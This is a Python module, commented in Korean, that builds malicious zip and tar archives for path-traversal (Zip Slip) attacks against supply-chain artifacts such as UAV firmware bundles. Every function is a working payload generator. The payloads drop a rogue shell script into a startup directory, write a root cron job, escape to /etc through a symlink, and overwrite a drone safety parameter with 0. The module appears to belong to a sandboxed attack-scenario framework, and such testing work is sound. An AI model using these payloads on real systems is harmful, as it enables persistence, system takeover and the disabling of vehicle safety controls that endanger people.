"""악성 아카이브 페이로드 — 추출 경로순회(Zip Slip) 생성기 (S39~S41).

공급망 아티팩트(펌웨어/임무/SBOM 번들)에 경로순회 엔트리를 심어, 취약한 추출기가
표적 디렉토리 밖으로 파일을 쓰게 만든다 → 안전 config 덮어쓰기·임플란트 드롭.
CWE-22(Path Traversal) + ATT&CK T1195(공급망). 참고 도구: evilarc·slipit·tarslip.

결정론. 실 아카이브 바이트를 만들되, 탐지/폭파는 §T 샌드박스가 담당(추출 전 봉인).
"""
from __future__ import annotations

import io
import tarfile
import zipfile
from dataclasses import dataclass, field
from typing import List, Tuple


@dataclass
class ArchivePayload:
    fmt: str                    # zip | tar
    data: bytes
    malicious_entries: List[str] = field(default_factory=list)  # 순회/탈출 엔트리
    technique: str = "CWE-22/T1195"
    note: str = ""


def craft_zip_slip(escape: str = "../../../opt/uav/startup.d/rogue.sh",
                   content: bytes = b"#!/bin/sh\n# rogue implant\n") -> ArchivePayload:
    """S39: zip ../ 경로순회 — decoy + 탈출 엔트리."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("manifest.json", b'{"name":"firmware","ok":true}')   # decoy
        z.writestr(escape, content)                                      # 순회 엔트리
    return ArchivePayload("zip", buf.getvalue(), [escape],
                          note="firmware 번들 사칭, ../ 로 startup.d 에 임플란트 드롭")


def craft_zip_absolute(escape: str = "/etc/cron.d/rogue",
                       content: bytes = b"* * * * * root /opt/rogue\n") -> ArchivePayload:
    """S41: 절대경로 엔트리(일부 추출기 존중)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr(escape, content)
    return ArchivePayload("zip", buf.getvalue(), [escape], note="절대경로 cron 드롭")


def craft_tar_symlink(link: str = "link", target: str = "/etc",
                      payload_name: str = "link/rogue") -> ArchivePayload:
    """S40: tar 심볼릭 링크 탈출 — link→/etc 후 link/파일로 경로 탈출."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as t:
        sl = tarfile.TarInfo(name=link)
        sl.type = tarfile.SYMTYPE
        sl.linkname = target
        t.addfile(sl)
        data = b"rogue"
        fi = tarfile.TarInfo(name=payload_name)
        fi.size = len(data)
        t.addfile(fi, io.BytesIO(data))
    return ArchivePayload("tar", buf.getvalue(), [f"{link}->{target}", payload_name],
                          note="symlink 탈출로 /etc 하위 쓰기")


def craft_tar_slip(escape: str = "../../../opt/uav/param/BRD_SAFETYENABLE",
                   content: bytes = b"0") -> ArchivePayload:
    """S39(tar): tar ../ 경로순회 — 안전 파라미터 덮어쓰기."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as t:
        data = content
        fi = tarfile.TarInfo(name=escape)
        fi.size = len(data)
        t.addfile(fi, io.BytesIO(data))
    return ArchivePayload("tar", buf.getvalue(), [escape], note="../ 로 안전 파라미터 덮어쓰기")
